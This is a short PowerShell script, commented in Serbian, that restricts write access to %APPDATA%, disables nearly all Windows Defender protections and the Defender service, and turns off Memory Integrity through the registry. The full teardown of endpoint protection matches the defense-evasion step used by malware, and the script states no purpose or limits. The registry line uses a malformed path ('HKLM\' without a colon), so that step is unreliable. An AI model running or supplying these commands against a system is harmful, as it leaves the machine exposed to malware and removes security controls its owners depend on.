# 1. Zabrani pisanje u %APPDATA% za Everyone
$AppData = $env:APPDATA
icacls $AppData /deny Everyone:(W) > $null 2>&1

# 2. Onemogući Windows Defender (potpuno)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -EnableControlledFolderAccess Disabled
Set-MpPreference -PUAProtection Disabled

# Dodatno: Onemogući Defender servis (zahteva restart i trajne izmene prava)
Stop-Service WinDefend -Force
Set-Service WinDefend -StartupType Disabled

# 3. Isključi Core Isolation (Memory Integrity)
# Ova postavka se nalazi u registru i menja se ovako:
Set-ItemProperty -Path "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0

# Za efikasnost promene Core Isolation, potreban je restart
Write-Host "Završeno. Restartuj računar da bi sve izmene stupile na snagu."
